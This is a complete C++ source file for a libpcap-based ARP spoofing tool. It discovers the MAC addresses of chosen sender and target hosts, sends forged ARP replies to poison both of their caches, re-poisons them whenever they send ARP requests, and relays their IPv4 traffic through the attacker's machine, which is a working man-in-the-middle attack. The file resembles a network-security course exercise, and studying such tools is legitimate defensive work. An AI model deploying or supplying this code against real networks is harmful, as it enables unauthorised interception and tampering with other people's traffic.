#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <vector>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>

#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h"
#include "mac.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct Interface {
    Mac mac;
    Ip  ip;
};

Interface getInterface(const char* ifname) {
    Interface me{};

    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) {
        perror("socket()");
        exit(1);
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, ifname, IFNAMSIZ);

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFHWADDR)");
        exit(1);
    }
    me.mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));

    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl(SIOCGIFADDR)");
        exit(1);
    }
    me.ip = Ip(reinterpret_cast<sockaddr_in*>(&ifr.ifr_addr)->sin_addr.s_addr);

    close(fd);
    return me;
}

struct Session {
    Ip  senderIp;
    Mac senderMac;
    Ip  targetIp;
    Mac targetMac;
};

EthArpPacket makePacket(const Mac& dmac, const Mac& smac,
                        uint16_t op,
                        const Ip&  sip,  const Mac& smac_arp,
                        const Ip&  tip,  const Mac& dmac_arp) {
    EthArpPacket p{};
    p.eth_.dmac_ = dmac;
    p.eth_.smac_ = smac;
    p.eth_.type_ = htons(EthHdr::Arp);

    p.arp_.hrd_ = htons(ArpHdr::ETHER);
    p.arp_.pro_ = htons(EthHdr::Ip4);
    p.arp_.hln_ = sizeof(Mac);
    p.arp_.pln_ = sizeof(Ip);
    p.arp_.op_  = htons(op);
    p.arp_.smac_ = smac_arp;
    p.arp_.sip_  = htonl(sip);
    p.arp_.tmac_ = dmac_arp;
    p.arp_.tip_  = htonl(tip);
    return p;
}

void sendPacket(pcap_t* handle, const EthArpPacket& p) {
    if (pcap_sendpacket(handle,
                        reinterpret_cast<const u_char*>(&p),
                        sizeof(EthArpPacket)) != 0) {
        fprintf(stderr, "pcap_sendpacket: %s\n", pcap_geterr(handle));
    }
}

Mac resolveMac(pcap_t* handle, const Interface& me, const Ip& targetIp) {
    EthArpPacket req = makePacket(
        Mac::broadcastMac(),  me.mac,
        ArpHdr::Request,
        me.ip,                me.mac,
        targetIp,             Mac::nullMac()
        );
    sendPacket(handle, req);

    while (true) {
        struct pcap_pkthdr* header;
        const u_char*       data;
        int res = pcap_next_ex(handle, &header, &data);
        if (res <= 0) continue;

        auto* eth = (EthHdr*)data;
        if (eth->type_ != htons(EthHdr::Arp)) continue;

        auto* arp = (ArpHdr*)(data + sizeof(EthHdr));

        if (arp->op_ != htons(ArpHdr::Reply)) continue;
        if (Ip(ntohl(arp->sip_)) != targetIp)  continue;

        return arp->smac_;
    }
}

void infectSender(pcap_t* handle,
                  const Interface& me,
                  const Session& s)
{
    sendPacket(handle,
               makePacket(
                   s.senderMac,
                   me.mac,
                   ArpHdr::Reply,
                   s.targetIp,
                   me.mac,
                   s.senderIp,
                   s.senderMac));
}

void infectTarget(pcap_t* handle,
                  const Interface& me,
                  const Session& s)
{
    sendPacket(handle,
               makePacket(
                   s.targetMac,
                   me.mac,
                   ArpHdr::Reply,
                   s.senderIp,
                   me.mac,
                   s.targetIp,
                   s.targetMac));
}

void relay(pcap_t* handle,
           const Mac& dst,
           const Mac& src,
           const pcap_pkthdr* header,
           const u_char* data) {

    std::vector<u_char> packet(data, data + header->caplen);

    auto* eth = (EthHdr*)packet.data();

    eth->dmac_ = dst;
    eth->smac_ = src;

    if (pcap_sendpacket(handle, packet.data(), packet.size()) != 0)
        fprintf(stderr, "relay error : %s\n", pcap_geterr(handle));
}

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip> <target ip> [sender2 target2 ...]\n");
    printf("sample : arp-spoof eth0 10.0.0.20 10.0.0.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || ((argc - 2) % 2 != 0)) {
        usage();
        return -1;
    }
    printf("sdfsdf");

    char* dev = argv[1];

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (!handle) {
        fprintf(stderr, "pcap_open_live(%s) return nullptr - %s\n", dev, errbuf);
        return -1;
    }
    Interface me = getInterface(dev);
    printf("[+] Attacker  IP  : %s\n", std::string(me.ip).c_str());
    printf("[+] Attacker  MAC : %s\n\n", std::string(me.mac).c_str());

    std::vector<Session> sessions;
    for (int i = 2; i < argc; i += 2) {
        Ip senderIp(argv[i]);
        Ip targetIp(argv[i + 1]);

        Mac senderMac = resolveMac(handle, me, senderIp);
        Mac targetMac = resolveMac(handle, me, targetIp);

        printf("[+] %s (%s)  ⇔  %s (%s)\n",
               std::string(senderIp).c_str(), std::string(senderMac).c_str(),
               std::string(targetIp).c_str(), std::string(targetMac).c_str());

        sessions.push_back({senderIp, senderMac, targetIp, targetMac});
    }
    puts("");

    for (const Session& s : sessions) {
        infectSender(handle, me, s);
        infectTarget(handle, me, s);
    }
    puts("[*] Infection packets sent (both directions). Entering relay loop...\n");

    while (true) {
        struct pcap_pkthdr* header;
        const u_char*       data;
        int res = pcap_next_ex(handle, &header, &data);
        if (res == 0) continue;
        if (res < 0) break;

        auto* eth = (EthHdr*)data;

        if (eth->type_ == htons(EthHdr::Ip4)) {
            for (const Session& s : sessions) {
                if (eth->smac_ == s.senderMac &&
                    eth->dmac_ == me.mac)
                {
                    relay(handle,
                          s.targetMac,
                          me.mac,
                          header,
                          data);
                    break;
                }

                if (eth->smac_ == s.targetMac &&
                    eth->dmac_ == me.mac)
                {
                    relay(handle,
                          s.senderMac,
                          me.mac,
                          header,
                          data);
                    break;
                }
            }
            continue;
        }

        if (eth->type_ == htons(EthHdr::Arp)) {
            auto* arp = (ArpHdr*)(data + sizeof(EthHdr));

            if (arp->op_ != htons(ArpHdr::Request)) continue;

            Ip  tip = Ip(ntohl(arp->tip_));
            Mac smac = arp->smac_;

            for (const Session& s : sessions) {
                if (tip == s.targetIp && smac == s.senderMac) {
                    infectSender(handle, me, s);
                    break;
                }

                if (tip == s.senderIp && smac == s.targetMac) {
                    infectTarget(handle, me, s);
                    break;
                }
            }
        }
    }

    pcap_close(handle);
    return 0;
}
